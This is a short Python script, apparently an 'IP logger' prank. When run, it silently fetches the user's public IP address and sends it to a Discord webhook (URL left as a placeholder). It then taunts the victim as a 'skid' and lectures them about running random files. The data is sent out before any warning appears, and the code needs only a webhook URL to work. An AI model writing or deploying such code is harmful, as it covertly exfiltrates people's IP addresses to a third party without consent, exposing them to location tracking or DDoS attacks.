import time
import platform
import os
import requests
import discord_webhook
from discord_webhook import DiscordWebhook, DiscordEmbed
ip = 'https://api.ipify.org/' 
output = requests.get(ip).text
webhook = DiscordWebhook(url='YOUR URL HERE')
embed = DiscordEmbed(title='someone got logged', description=output, color=65280)
embed.set_timestamp()
webhook.add_embed(embed)
response = webhook.execute()
print("get LOGGED SKID I GOT YOUR IP ITS" " " + output + " "  "AM I RIGHT?")
feeling= input("How do you feel? anser in good or bad?:")
if feeling.lower() == 'bad':
    print("Man you should thats why you dont run random files on this biggg internet")
if feeling.lower() == 'good':
    print("MAN are you dumb or what? lets imagine if this logged you for real what will you do? someone can get your location ddos you etc a form for info on what if someone gets your ip https://smartproxy.com/what-is-a-proxy/what-can-someone-do-with-your-ip-address#:~:text=If%20someone%20knows%20your%20IP,connect%20to%20your%20device%20directly.&text=There%20are%20tens%20of%20thousands,data%20or%20even%20impersonate%20you")
print("Have a great day!")
time.sleep(5)
